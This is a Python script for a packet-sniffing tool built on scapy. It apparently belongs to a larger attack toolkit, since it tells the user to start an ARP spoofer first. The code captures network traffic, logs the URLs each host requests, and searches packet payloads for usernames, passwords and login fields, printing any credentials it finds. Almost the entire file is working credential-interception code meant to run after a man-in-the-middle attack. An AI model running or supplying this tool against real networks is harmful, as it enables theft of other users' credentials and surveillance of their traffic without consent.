#!/usr/bin/env python3

import time
from colorama import Fore, Style
import scapy.all as scapy
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re

choice = "Y"

def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ifconfig", interface])
        return re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(output)).group(0)
    except Exception as e:
        print(f"Error getting MAC address: {e}")
        return None

def get_current_ip(interface):
    try:
        output = subprocess.check_output(["ifconfig", interface])
        pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
        output1 = output.decode()
        match = pattern.search(output1)
        if match:
            return match[0]
    except Exception as e:
        print(f"Error getting IP address: {e}")
    return None

def ip_table():
    addrs = psutil.net_if_addrs()
    t = PrettyTable([f'{Fore.GREEN}Interface', 'Mac Address', f'IP Address{Style.RESET_ALL}'])
    for k, v in addrs.items():
        mac = get_current_mac(k)
        ip = get_current_ip(k)
        if ip and mac:
            t.add_row([k, mac, ip])
        elif mac:
            t.add_row([k, mac, f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([k, f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}", ip])
    print(t)

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(scapy.IP):
        ip_layer = packet.getlayer(scapy.IP)
        print(f"[+] IPv4 Packet >>>>>")
        print(f"Source IP: {ip_layer.src}")
        print(f"Destination IP: {ip_layer.dst}")
        print(f"Protocol: {ip_layer.proto}")
        print(f"Packet Length: {len(packet)} bytes")
        print(f"Flags: {ip_layer.flags}")
        print(f"Fragment Offset: {ip_layer.frag}")
        print("-" * 40)
    
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP REQUEST >>>>>")
        url_extractor(packet)
        test = get_login_info(packet)
        if test:
            print(f"{Fore.GREEN}[+] Username OR password is Sent >>>> ", test, f"{Style.RESET_ALL}")
        if choice.lower() == "y":
            raw_http_request(packet)
    
    # Check for raw packet data for potential HTTPS metadata
    elif packet.haslayer(scapy.Raw):
        print("[+] Potential HTTPS traffic detected >>>>>")
        raw_https_request(packet)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load_decode = load.decode(errors='ignore')
        keywords = ["username", "user", "email", "pass", "login", "password", "UserName", "Password"]
        for keyword in keywords:
            if keyword in load_decode:
                return load_decode
    return None

def url_extractor(packet):
    http_layer = packet.getlayer(http.HTTPRequest).fields
    ip_layer = packet.getlayer(scapy.IP).fields
    print(ip_layer["src"], "just requested", http_layer["Method"].decode(), http_layer["Host"].decode(), http_layer["Path"].decode())

def raw_https_request(packet):
    raw_data = packet[scapy.Raw].load
    print("-----------------***Raw HTTPS Packet Data***-------------------")
    print(raw_data)
    print("---------------------------------------------------------")

def raw_http_request(packet):
    httplayer = packet[http.HTTPRequest].fields
    print("-----------------***Raw HTTP Packet***-------------------")
    print("{:<8} {:<15}".format('Key', 'Label'))
    try:
        for k, v in httplayer.items():
            try:
                label = v.decode()
            except:
                label = str(v)
            print("{:<40} {:<15}".format(k, label))
    except KeyboardInterrupt:
        print("\n[+] Quitting Program...")
    print("---------------------------------------------------------")

def print_ascii_art():
    ascii_art = """

$$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$$\        $$$$$$\  $$\   $$\ $$$$$$\ $$$$$$$$\ $$$$$$$$\ $$$$$$$$\ $$$$$$$\  
$$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |$$  _____|\__$$  __|      $$  __$$\ $$$\  $$ |\_$$  _|$$  _____|$$  _____|$$  _____|$$  __$$\ 
$$ |  $$ |$$ /  $$ |$$ /  \__|$$ |$$  / $$ |         $$ |         $$ /  \__|$$$$\ $$ |  $$ |  $$ |      $$ |      $$ |      $$ |  $$ |
$$$$$$$  |$$$$$$$$ |$$ |      $$$$$  /  $$$$$\       $$ |         \$$$$$$\  $$ $$\$$ |  $$ |  $$$$$\    $$$$$\    $$$$$\    $$$$$$$  |
$$  ____/ $$  __$$ |$$ |      $$  $$<   $$  __|      $$ |          \____$$\ $$ \$$$$ |  $$ |  $$  __|   $$  __|   $$  __|   $$  __$$< 
$$ |      $$ |  $$ |$$ |  $$\ $$ |\$$\  $$ |         $$ |         $$\   $$ |$$ |\$$$ |  $$ |  $$ |      $$ |      $$ |      $$ |  $$ |
$$ |      $$ |  $$ |\$$$$$$  |$$ | \$$\ $$$$$$$$\    $$ |         \$$$$$$  |$$ | \$$ |$$$$$$\ $$ |      $$ |      $$$$$$$$\ $$ |  $$ |
\__|      \__|  \__| \______/ \__|  \__|\________|   \__|          \______/ \__|  \__|\______|\__|      \__|      \________|\__|  \__|
                                                                                                                                      
                                                                                                                   BY LOKESHWAR-BH4G47                                                                                                                             
                                                                                                                                      
                                                   
    """
    print(f"{Fore.CYAN}{ascii_art}{Style.RESET_ALL}")

def main_sniff():
    print_ascii_art()
    print(f"{Fore.BLUE}Welcome To Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}")
    try:
        global choice
        choice = input("[*] Do you want to print the raw Packet: Y/N: ")
        ip_table()
        interface = input("[*] Please enter the interface name: ")
        print("[*] Sniffing Packets...")
        sniff(interface)
        print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)

if __name__ == "__main__":
    main_sniff()
